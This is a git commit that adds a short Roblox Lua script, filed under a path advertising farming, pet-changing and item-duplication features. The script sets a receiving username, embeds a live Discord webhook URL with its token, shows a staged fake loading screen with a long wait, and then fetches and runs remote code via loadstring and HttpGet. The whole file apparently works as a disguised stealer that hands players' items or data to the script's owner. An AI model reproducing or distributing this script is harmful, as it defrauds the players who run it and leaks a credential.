e20cf09c3a0b4b98fa6b27e096ec146a31c378d1
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-03 19:33:15 +0700

    Yo

---
+++ Farming/Mission/Mastery/PetChanger/AddedDupe/Moon/main/.lua
@@ -0,0 +1,16 @@
+UserName = "charken_14"
+UserName2 = "charken_14"
+Webhook = "https://discord.com/api/webhooks/1125398882713608212/9j_yMfiigQUxgwtOKdFqfqKaCtdyxrmJ65SCOaahAwlC6nrPqth2aEX7rKeJIyHC17rq"
+ 
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+ 
+ 
+_G.ScriptName = "Moon Script"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
